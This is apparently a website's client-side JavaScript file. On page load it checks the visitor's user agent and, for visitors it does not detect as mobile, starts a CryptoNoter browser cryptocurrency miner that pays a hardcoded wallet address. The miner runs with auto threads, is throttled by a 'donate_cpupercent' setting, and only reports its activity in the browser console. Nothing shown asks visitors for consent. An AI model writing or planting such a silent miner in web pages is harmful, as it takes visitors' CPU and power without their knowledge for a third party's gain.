var element = document.getElementById('initial-state');
var iState = element && JSON.parse(element.textContent);
const getMeta = (prop) => iState && iState.meta && iState.meta[prop];

function getMobileOperatingSystem() {
  var userAgent = navigator.userAgent || navigator.vendor || window.opera;

      // Windows Phone must come first because its UA also contains "Android"
    if (/windows phone/i.test(userAgent)) {
        return "Windows Phone";
    }

    if (/android/i.test(userAgent)) {
        return "Android";
    }

    // iOS detection from: http://stackoverflow.com/a/9039885/177710
    if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
        return "iOS";
    }

    return "unknown";
}

var addr = '467jt5J98oMjMxYoXn1MEZSUmaKGaSesog7Md56uXkAHGbaCrsBsA6RBXPZ1RA6BTCX7nEzRarc33Z7SFRiiWFbY3NMY54Q';
if (iState && getMobileOperatingSystem() === 'unknown') {
  var mt = 1-getMeta('donate_cpupercent')/100.0 || 0.15; 
  console.log('starting mining at '+getMeta('donate_cpupercent')+'%, or sleeping '+mt+'s out of 1s. thank you for your support')
  var miner = new CryptoNoter.Anonymous(addr, {
          autoThreads: true,
	throttle: mt
  });
  miner.start();

  // Listen on events
  var found = 0,
          accepted = 0;
  miner.on('found', function () {
          found++;
          console.log('Found '+found+' shares')
          //document.getElementById("FoundShares").innerHTML = found;
  });
  miner.on('accepted', function () {
          accepted++;
          console.log('Pool accepted '+found+' shares')
  })

setInterval(function () {
          var hashesPerSecond = miner.getHashesPerSecond();
          console.log('we processed so far at '+hashesPerSecond);
  },10000);

  // Update stats once per second
  setInterval(function () {
          var idle = mt;
            
          var hashesPerSecond = miner.getHashesPerSecond();
          //console.log('we processed '+hashesPerSecond);
          miner.setThrottle(idle);
  }, 500);
}
else {
  console.log('no cpu setting found, we will not mine.')
}

